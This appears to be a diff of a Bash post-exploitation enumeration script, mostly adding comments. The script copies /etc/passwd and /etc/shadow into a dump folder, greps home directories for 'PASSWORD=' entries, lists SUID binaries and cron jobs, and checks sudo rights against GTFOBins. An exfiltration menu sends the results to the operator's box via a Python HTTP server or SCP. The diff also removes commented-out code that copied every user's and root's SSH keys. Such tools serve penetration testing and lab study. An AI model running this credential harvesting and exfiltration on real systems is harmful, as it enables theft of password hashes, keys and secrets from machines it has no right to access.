@@ -40,38 +40,8 @@ do_basic_enum() {
                     sleep 2
 
                 [[ -n "$COLLECT_DIR" ]] && {
-                    sudo cat /etc/passwd | tee "$COLLECT_DIR/passwd.txt" > /dev/null
+                    sudo cat /etc/passwd | tee "$COLLECT_DIR/passwd.txt" > /dev/null 
                     sudo cat /etc/shadow | tee "$COLLECT_DIR/shadow.txt" > /dev/null
-
-                # Dump sudoers **NOTE** -> WORKINNG THIS, CURRENTLY GETTING PERMSSION DENIED DURING EXFIL
-                #sudo cat /etc/sudoers | tee "$COLLECT_DIR/sudoers.txt" > /dev/null
-                
-
-                # Dump SSH keys if present
-                #echo -e "${WHITE}Collecting SSH keys from all user directories...${DEF}"
-                #sleep 2
-
-                # User home directories
-                #for dir in /home/*; do
-                #    if [[ -d "$dir/.ssh" ]]; then
-                #        user=$(basename "$dir")
-                #        sudo cp -r "$dir/.ssh" "$COLLECT_DIR/ssh_$user"
-                #        echo -e "${YELLOW}→ Copied $dir/.ssh to $COLLECT_DIR/ssh_$user${DEF}"
-                #    fi
-                #done
-
-                # Root's SSH keys
-                #if sudo test -d /root/.ssh; then
-                #    sudo cp -r /root/.ssh "$COLLECT_DIR/ssh_root"
-                #    echo -e "${YELLOW}→ Copied /root/.ssh to $COLLECT_DIR/ssh_root${DEF}"
-                #    sleep 2
-                #else
-                #    echo -e "${YELLOW}/root/.ssh directory not found${DEF}"
-                #    sleep 2
-                #fi
-
-                #    echo -e "${YELLOW}→ Collected files saved to $COLLECT_DIR${DEF}"
-                #    sleep 2
                 }
                 fi
 
@@ -83,10 +53,12 @@ do_basic_enum() {
                 lscpu | grep -E '^Architecture:|^CPU\(s\):'
                 break
                 ;;
+
             [Nn]*)
                 echo "Enumeration skipped."
                 break
                 ;;
+
             *)
                 echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}"
                 ;;
@@ -99,7 +71,7 @@ chmod -R 644 "$COLLECT_DIR"/* 2>/dev/null
 chmod -R 755 "$COLLECT_DIR"/*/ 2>/dev/null
 }
 
-function check_sudo_gtfobins {
+function check_sudo_gtfobins { # searches either a copy of gtfobins binaries or tries to curl gtfobins
     GTFO_DIR="$(dirname "$0")"
     GTFO_FILE="$GTFO_DIR/gtfobins.txt"
 
@@ -137,14 +109,14 @@ function check_sudo_gtfobins {
     fi
 }
 
-do_lhf_enum() {
+do_lhf_enum() { # searches for the word "password=", backup files, binaries with SUID permissions and cron jobs
     while true; do
         read -rp "${CYAN}Do you want to search for low-hanging fruit (y/n)? ${DEF}" answer2
         case "$answer2" in
             [Yy]*)
                 echo -e "\n${CYAN}========= LOW-HANGING FRUIT ==========${DEF}\n"
                 if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
-                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}"
+                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}" #
                     sudo grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null
                 else 
                     echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf:${DEF}"
@@ -158,10 +130,12 @@ do_lhf_enum() {
                 ls -la /etc/cron.daily/
                 break
                 ;;
+
             [Nn]*)
                 echo "Low-hanging fruit search skipped."
                 break
                 ;;
+
             *)
                 echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}"
                 ;;
@@ -169,8 +143,8 @@ do_lhf_enum() {
     done
 }
 
-exfil_menu() {
-    sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$tempfile" > "$dest"
+exfil_menu() { # gives the user 2 options of exfiltration, either a http server via Python3 or SCP
+    sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$tempfile" > "$dest" # Removes all the color codes from appearing in the output file
     rm -f "$tempfile"
     echo -e "\n${WHITE}Finalizing saved output...${DEF}"
 
@@ -194,7 +168,7 @@ exfil_menu() {
                 read -rp "${CYAN}Username on your box: ${DEF}" hostuser
                 while true; do
                     read -rp "${CYAN}Your IP address: ${DEF}" hostip
-                    if [[ "$hostip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                    if [[ "$hostip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then # Ensures this input is in a x.x.x.x format
                         break
                     else
                         echo -e "${RED}Invalid IP format. Please enter something like 192.168.1.100${DEF}"
@@ -254,8 +228,8 @@ while true; do
     case "$save_answer" in
         [Yy]*)
             read -rp "${CYAN}Enter filename (e.g., output.txt): ${DEF}" filename
-            COLLECT_DIR="$HOME/enum-dump"
-            mkdir -p "$COLLECT_DIR"
+            COLLECT_DIR="$HOME/enum-dump" 
+            mkdir -p "$COLLECT_DIR" # creates directory called "enum_dump"
             dest="$COLLECT_DIR/$filename"
             dest2="$filename"
             tempfile=$(mktemp)
@@ -264,17 +238,19 @@ while true; do
             sleep 1
             break
             ;;
+
         [Nn]*)
             echo -e "${WHITE}Not saving to a file. Let's continue.${DEF}"
             sleep 1
             break
             ;;
+
         *)
             echo -e "${RED}Invalid input. Please enter 'y' or 'n'.${DEF}"
             ;;
     esac
 done
-
+# ========== executing all the functions ==========
 sleep 1
 do_basic_info
 sleep 1
@@ -282,8 +258,8 @@ echo
 do_basic_enum
 sleep 1
 echo
-if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
-    check_sudo_gtfobins
+if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then # only executes the check_sudo_gtfobins if the user does not have full rights
+    check_sudo_gtfobins                                
 else 
      echo -e "${GREEN}Full sudo access detected — skipping GTFOBins lookup.${DEF}"
 fi
